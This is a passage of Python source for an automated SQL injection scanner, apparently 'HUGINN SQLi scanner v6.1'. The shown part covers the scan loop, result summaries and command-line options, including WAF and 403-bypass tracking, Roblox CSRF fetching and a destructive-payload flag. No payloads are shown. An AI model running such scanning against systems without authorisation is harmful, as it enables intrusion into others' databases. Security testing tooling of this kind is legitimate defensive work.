            else:
                log("auth: no header profiles found", "info", "SQLI")
        else:
            log("auth: no HeaderJar (unauthenticated)", "info", "SQLI")

        if self.roblox_csrf_enabled and _ROBLOX_CSRF_AVAILABLE:
            log("Roblox CSRF: ON (auto-fetch per host)", "info", "SQLI")

        if self.brain is not None and self.brain.available():
            log("AI triage: ON ({} / {})".format(
                self.brain.cfg["label"], self.brain.model), "info", "SQLI")
            log("AI severity: {}".format(
                "ON" if self.ai_severity_enabled else "OFF"), "info", "SQLI")
        else:
            log("AI triage: OFF (running without triage)", "warn", "SQLI")
            log("  hint: run 'python3 brain.py reset-cache' and retry",
                "info", "SQLI")

        log("min severity filter: {}".format(self.min_severity), "info")
        log("max payloads/IP: {}".format(self.max_payloads_per_ip or "unlimited"),
            "info")
        log("header set: {} ({} headers)".format(
            self.header_set, len(self.enabled_headers)), "info")
        log("path mode: {}".format(self.path_mode), "info")
        log("smoke test: {}".format("ON" if self.smoke_test_enabled else "OFF"),
            "info")
        log("method fuzzing: {}".format("ON" if self.method_fuzz else "OFF"),
            "info")
        log("403/401 bypass: {}".format(
            "ON" if self.bypass_403_enabled else "OFF"), "info")

        payloads = self.load_and_filter_payloads()
        log("loaded {} payloads (waf={}, dbms={})".format(
            len(payloads), self.waf_hint or "none", self.dbms_hint or "none"),
            "info")

        pages = []
        for jf in self.sites_root.rglob("*.json"):
            if jf.name.startswith("_"):
                continue
            try:
                rec = load_json(jf)
                if rec.get("url") and not _is_static_url(rec["url"]):
                    pages.append(rec)
            except Exception:
                continue
        log("loaded {} testable pages".format(len(pages)), "info")

        points = extract_injection_points(
            pages,
            method_fuzz=self.method_fuzz,
            path_mode=self.path_mode,
            enabled_headers=self.enabled_headers,
        )
        points = self._spread_points(points)

        loc_counts = {}
        for ip in points:
            loc_counts[ip.location] = loc_counts.get(ip.location, 0) + 1
        log("extracted {} injection points: {}".format(
            len(points),
            "  ".join("{}={}".format(k, v)
                      for k, v in sorted(loc_counts.items()))),
            "ok")

        if not points:
            log("nothing to test", "warn")
            return []

        section("SQLi SCANNER :: STRIKE PHASE")
        all_findings = []
        done = 0
        total = len(points)
        skipped_by_smoke = [0]
        t0 = time.time()

        try:
            with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
                futures = {pool.submit(self.test_point, ip, payloads): ip
                            for ip in points}
                for fut in as_completed(futures):
                    done += 1
                    ip = futures[fut]
                    try:
                        result = fut.result()
                        all_findings.extend(result)
                        if not ip.worth_testing:
                            skipped_by_smoke[0] += 1
                    except Exception as e:
                        log("error testing {}: {}".format(ip, e), "warn")

                    if done % 25 == 0 or done == total:
                        elapsed = time.time() - t0
                        rate = done / elapsed if elapsed > 0 else 0
                        eta = (total - done) / rate if rate > 0 else 0
                        log("progress {}/{}  hits={}  skipped={}  ~{:.1f}/s  "
                            "ETA {}".format(
                                done, total, len(all_findings),
                                skipped_by_smoke[0], rate,
                                format_duration(eta)), "info")
        except KeyboardInterrupt:
            log("interrupted — saving partial findings", "warn", "SQLI")
        finally:
            elapsed = time.time() - t0

        section("SQLi SCANNER :: COMPLETE")

        by_conf = {}
        by_severity = {}
        by_verdict = {}
        by_method = {}
        by_location = {}
        for f in all_findings:
            by_conf[f["confidence"]] = by_conf.get(f["confidence"], 0) + 1
            sev = f.get("severity", "low")
            by_severity[sev] = by_severity.get(sev, 0) + 1
            m = f.get("verification_method", "unknown")
            by_method[m] = by_method.get(m, 0) + 1
            loc = f.get("injection_point", {}).get("location", "unknown")
            by_location[loc] = by_location.get(loc, 0) + 1
            v = (f.get("ai_triage") or {}).get("verdict")
            if v:
                by_verdict[v] = by_verdict.get(v, 0) + 1

        if all_findings:
            for c in ("high", "medium", "low"):
                if c in by_conf:
                    log("confidence {} : {}".format(c, by_conf[c]), "info")
            for s in ("critical", "high", "medium", "low", "info"):
                if s in by_severity:
                    log("severity   {} : {}".format(s, by_severity[s]), "ok")
            if by_verdict:
                log("AI verdict    : {}".format(by_verdict), "info")
            log("methods       : {}".format(by_method), "info")
            log("by location   : {}".format(by_location), "info")
            log("total saved   : {}".format(len(all_findings)), "ok", "DONE")
        else:
            log("no SQLi findings saved", "info", "DONE")

        if skipped_by_smoke[0]:
            log("smoke-filtered : {} IPs (no reaction to probe)".format(
                skipped_by_smoke[0]), "info")

        with self._waf_lock:
            waf_hosts = {h: v for h, v in self.host_waf.items()
                          if not h.endswith(":augmented") and v}
            rl_hosts = dict(self.host_rl_counts)
            b403_hosts = dict(self.host_403_counts)
            bypass_success = {h: len(v) for h, v in self.host_bypass_success.items()}
        with self._auth_lock:
            expired_hosts = [h for h, v in self.host_auth_expired.items() if v]

        if waf_hosts:
            log("WAF-protected hosts: {}".format(
                ", ".join("{} ({})".format(h, w) for h, w in waf_hosts.items())),
                "info")
        if rl_hosts:
            log("rate-limited hosts: {}".format(
                ", ".join("{} ({}×)".format(h, c) for h, c in rl_hosts.items())),
                "info")
        if b403_hosts:
            log("403-hitting hosts : {}".format(
                ", ".join("{} ({}×)".format(h, c) for h, c in b403_hosts.items())),
                "info")
        if bypass_success:
            log("bypass successes  : {}".format(
                ", ".join("{} ({} ways)".format(h, n)
                          for h, n in bypass_success.items())),
                "ok")
        if expired_hosts:
            log("auth-expired hosts: {}".format(", ".join(expired_hosts)),
                "warn")

        if self.ai_dropped:
            log("AI/filter dropped: {}".format(len(self.ai_dropped)), "info")
            try:
                save_json(self.findings_root / "_ai_dropped.json", self.ai_dropped)
            except Exception:
                pass

        log("elapsed       : {}".format(format_duration(elapsed)), "info")

        try:
            save_json(self.findings_root / "_summary.json", {
                "total_saved":     len(all_findings),
                "total_dropped":   len(self.ai_dropped),
                "by_confidence":   by_conf,
                "by_severity":     by_severity,
                "by_ai_verdict":   by_verdict,
                "by_method":       by_method,
                "by_location":     by_location,
                "smoke_filtered":  skipped_by_smoke[0],
                "header_set":      self.header_set,
                "path_mode":       self.path_mode,
                "waf_hint":        self.waf_hint,
                "dbms_hint":       self.dbms_hint,
                "min_severity":    self.min_severity,
                "method_fuzz":     self.method_fuzz,
                "bypass_403":      self.bypass_403_enabled,
                "waf_hosts":       waf_hosts,
                "rate_limited":    rl_hosts,
                "hosts_403":       b403_hosts,
                "bypass_success":  bypass_success,
                "auth_expired":    expired_hosts,
                "auth_enabled":    self.header_jar is not None,
                "elapsed_seconds": round(elapsed, 1),
                "timestamp":       now_iso(),
                "findings": [
                    {"url": f["url"], "param": f["parameter"],
                     "location": f.get("injection_point", {}).get("location"),
                     "severity": f.get("severity"),
                     "confidence": f["confidence"],
                     "method": f.get("verification_method"),
                     "payload_name": f.get("payload_name"),
                     "ai_verdict": (f.get("ai_triage") or {}).get("verdict"),
                     "ai_severity": (f.get("ai_severity") or {}).get("severity")}
                    for f in all_findings
                ],
            })
        except Exception as e:
            log("failed to write summary: {}".format(e), "warn", "SQLI")

        try:
            save_json(self.findings_root / "_session.json", {
                "targets":         len(points),
                "by_location":     loc_counts,
                "payloads_loaded": len(payloads),
                "auth_enabled":    self.header_jar is not None,
                "ai_enabled":      (self.brain is not None and
                                     self.brain.available()),
                "ai_provider":     (self.brain.provider if self.brain else None),
                "ai_model":        (self.brain.model if self.brain else None),
                "method_fuzz":     self.method_fuzz,
                "bypass_403":      self.bypass_403_enabled,
                "roblox_csrf":     self.roblox_csrf_enabled,
                "header_set":      self.header_set,
                "path_mode":       self.path_mode,
                "smoke_test":      self.smoke_test_enabled,
                "waf_hosts":       waf_hosts,
                "rate_limited":    rl_hosts,
                "hosts_403":       b403_hosts,
                "bypass_success":  bypass_success,
                "auth_expired":    expired_hosts,
                "started_at":      now_iso(),
                "elapsed_seconds": round(elapsed, 1),
            })
        except Exception:
            pass

        return all_findings


# =============================================================================
#  ENTRY
# =============================================================================
def run(program_dir, sites_root=None, waf_hint=None, dbms_hint=None,
        cookie=None, user_agent=None, confirm_timing=True,
        min_severity="medium", use_ai=True, ai_severity=True,
        headers_dir=None, cli_headers=None, no_auth=False,
        max_payloads_per_ip=50, allow_destructive=False,
        confirm_medium=True, method_fuzz=False, bypass_403=True,
        roblox_csrf=True, header_set="minimal",
        path_mode="id_like", smoke_test=True):
    scanner = SQLiScanner(
        program_dir=program_dir,
        sites_root=sites_root,
        waf_hint=waf_hint,
        dbms_hint=dbms_hint,
        cookie=cookie,
        user_agent=user_agent,
        confirm_timing=confirm_timing,
        min_severity=min_severity,
        use_ai=use_ai,
        ai_severity=ai_severity,
        headers_dir=headers_dir,
        cli_headers=cli_headers,
        no_auth=no_auth,
        max_payloads_per_ip=max_payloads_per_ip,
        allow_destructive=allow_destructive,
        confirm_medium=confirm_medium,
        method_fuzz=method_fuzz,
        bypass_403=bypass_403,
        roblox_csrf=roblox_csrf,
        header_set=header_set,
        path_mode=path_mode,
        smoke_test=smoke_test,
    )
    return scanner.run()


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="HUGINN SQLi scanner v6.1")
    ap.add_argument("program_dir")
    ap.add_argument("--waf", default=None)
    ap.add_argument("--dbms", default=None)
    ap.add_argument("--cookie", default=None)
    ap.add_argument("--user-agent", default=None)
    ap.add_argument("--headers-dir", default=None)
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--no-auth", action="store_true")
    ap.add_argument("--no-confirm-timing", action="store_true")
    ap.add_argument("--no-confirm-medium", action="store_true")
    ap.add_argument("--time-threshold", type=float, default=4.0)
    ap.add_argument("--min-severity", default="medium",
                    choices=["critical", "high", "medium", "low", "info"])
    ap.add_argument("--no-ai", action="store_true")
    ap.add_argument("--no-ai-severity", action="store_true")
    ap.add_argument("--max-payloads-per-ip", type=int, default=50)
    ap.add_argument("--allow-destructive", action="store_true")
    ap.add_argument("--method-fuzz", action="store_true")
    ap.add_argument("--no-bypass-403", action="store_true")
    ap.add_argument("--no-roblox-csrf", action="store_true")
    ap.add_argument("--no-smoke-test", action="store_true",
                    help="skip quick smoke probes per IP")
    ap.add_argument("--header-set", default="minimal",
                    choices=list(HEADER_SETS.keys()),
                    help="header injection breadth (default: minimal)")
    ap.add_argument("--path-injection", default="id_like",
                    choices=["id_like", "all", "off"],
                    help="path segment injection mode (default: id_like)")
    ap.add_argument("--safe", action="store_true",
                    help="safe mode: no headers, no paths, no method-fuzz")
    args = ap.parse_args()

    cli_headers = {}
    for h in args.header:
        if ":" in h:
            n, _, v = h.partition(":")
            cli_headers[n.strip()] = v.strip()

    header_set = "minimal"
    path_mode = args.path_injection
    method_fuzz = args.method_fuzz

    if args.safe:
        header_set = "minimal"
        path_mode = "off"
        method_fuzz = False
        log("safe mode: headers=minimal paths=off method_fuzz=off", "warn")
    else:
        header_set = args.header_set

    run(args.program_dir,
        waf_hint=args.waf,
        dbms_hint=args.dbms,
        cookie=args.cookie,
        user_agent=args.user_agent,
        confirm_timing=not args.no_confirm_timing,
        min_severity=args.min_severity,
        use_ai=not args.no_ai,
        ai_severity=not args.no_ai_severity,
        headers_dir=args.headers_dir,
        cli_headers=cli_headers,
        no_auth=args.no_auth,
        max_payloads_per_ip=args.max_payloads_per_ip,
        allow_destructive=args.allow_destructive,
        confirm_medium=not args.no_confirm_medium,
        method_fuzz=method_fuzz,
        bypass_403=not args.no_bypass_403,
        roblox_csrf=not args.no_roblox_csrf,
        header_set=header_set,
        path_mode=path_mode,
        smoke_test=not args.no_smoke_test)
